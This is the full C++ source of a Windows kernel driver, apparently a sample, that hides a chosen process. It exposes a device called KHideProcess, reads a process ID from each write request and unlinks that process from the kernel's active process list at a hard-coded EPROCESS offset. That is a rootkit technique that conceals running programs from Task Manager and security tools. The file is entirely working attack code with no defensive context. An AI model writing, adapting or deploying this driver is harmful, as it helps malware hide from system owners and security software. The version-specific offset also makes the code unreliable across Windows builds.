#include <ntifs.h>

void OnUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING sym = RTL_CONSTANT_STRING(L"\\??\\KHideProcess");
	IoDeleteSymbolicLink(&sym);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS HideProcess(ULONG pid) {
	PEPROCESS process;
	auto status = PsLookupProcessByProcessId(ULongToHandle(pid), &process);
	if (!NT_SUCCESS(status))
		return status;

	// hide!
	LIST_ENTRY* entry = (LIST_ENTRY*)((char*)process + 0x1d8);
	RemoveEntryList(entry);
	entry->Blink = entry->Flink = nullptr;

	ObDereferenceObject(process);
	return STATUS_SUCCESS;
}

NTSTATUS OnCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

NTSTATUS OnWrite(PDEVICE_OBJECT, PIRP Irp) {
	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_SUCCESS;
	do {
		if (irpSp->Parameters.Write.Length < sizeof(ULONG)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		auto pid = *(ULONG*)Irp->UserBuffer;
		status = HideProcess(pid);
	} while (false);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return status;
}


extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	PDEVICE_OBJECT devObj;
	UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\KHideProcess");
	auto status = IoCreateDevice(DriverObject, 0, &name, FILE_DEVICE_UNKNOWN,
		0, FALSE, &devObj);
	if (!NT_SUCCESS(status))
		return status;

	UNICODE_STRING sym = RTL_CONSTANT_STRING(L"\\??\\KHideProcess");
	status = IoCreateSymbolicLink(&sym, &name);
	if (!NT_SUCCESS(status))
		return status;

	DriverObject->DriverUnload = OnUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = OnWrite;

	return STATUS_SUCCESS;
}
